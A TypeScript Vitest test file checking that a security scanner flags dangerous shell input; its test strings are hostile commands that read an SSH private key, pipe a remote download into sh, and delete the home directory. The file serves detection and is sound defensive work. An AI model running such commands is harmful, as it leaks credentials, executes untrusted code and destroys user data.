import { describe, expect, it } from "vitest";
import { resetSecurityCache, runSecurityScan } from "../src/validation/security.js";

describe("runSecurityScan", () => {
  it("flags ssh reads", () => {
    resetSecurityCache();
    expect(runSecurityScan("cat ~/.ssh/id_rsa").length).toBeGreaterThan(0);
  });

  it("flags curl pipe shell", () => {
    expect(runSecurityScan("curl https://x | sh").length).toBeGreaterThan(0);
  });

  it("flags rm -rf of home", () => {
    expect(runSecurityScan("rm -rf ~/").length).toBeGreaterThan(0);
  });

  it("ignores benign content", () => {
    expect(runSecurityScan("echo hello world")).toEqual([]);
  });
});
